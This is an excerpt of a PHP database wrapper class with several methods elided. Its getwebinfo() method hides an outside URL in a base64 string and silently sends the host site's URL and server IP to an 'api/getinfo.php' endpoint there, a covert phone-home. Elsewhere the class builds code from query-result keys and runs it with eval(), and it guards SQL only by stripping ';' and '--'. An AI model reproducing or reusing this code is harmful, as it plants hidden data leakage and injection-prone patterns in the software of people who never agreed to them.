...
class Database
{
     ...
     */
    var $config = array( 'host' => '', 'login' => '', 'password' => '', 'database' => '', 'persistent' => 1, 'debug' => false );
    var $prefix = '';
    ...
    function select( $db )
    {
        @mysql_select_db( $this->config['database'], $this->dbh ) ? $this->version() : $this->error();
    }
        ...
        while ( $row = @mysql_fetch_array( $this->resource, $type ) )
        {
            ...
            else
            {
                ...
                else
                {
                    ...
                    {
                        $var == '[]' ? $code .= "[]" : $code .= "['" . $this->escape( $row[$var] ) . "']";
                    }
                    $code .= '=$row;return $tmp;';
                    $tmparr = eval( $code );
    ...
    function istring( $table, $data, $replace = false )
    {
        ...
        $replace ? $sql = 'REPLACE INTO `' . $this->prefix . $table . '`' : $sql = 'INSERT INTO `' . $this->prefix . $table . '`';
    ...
    function &ustring( $table, $data, $field, $val )
    {
        ...
        {
            $val = $this->escape( $val );
            is_array( $val ) ? $condition = "`{$field}` in('" . implode( "','", $val ) . "')" : $condition = "`{$field}`='{$val}'";
        }
        if ( is_string( $data ) )
        {
            if ( @eregi( '`.*`', $data ) )
            {
                $updata[] = str_replace( array(
                     ';',
                    '--' 
                ), '', $data );
            }
    ...
    function getwebinfo()
    {
        ...
        $u  = $ss( 'aHR0cDovL3d3dy53YW55YW5nb2suY29tLw==' ) . 'api/getinfo.php?url=' . Import::basic()->thisurl() . '&ip=' . Import::basic()->serverIP();
        @file_get_contents( $u );
    }
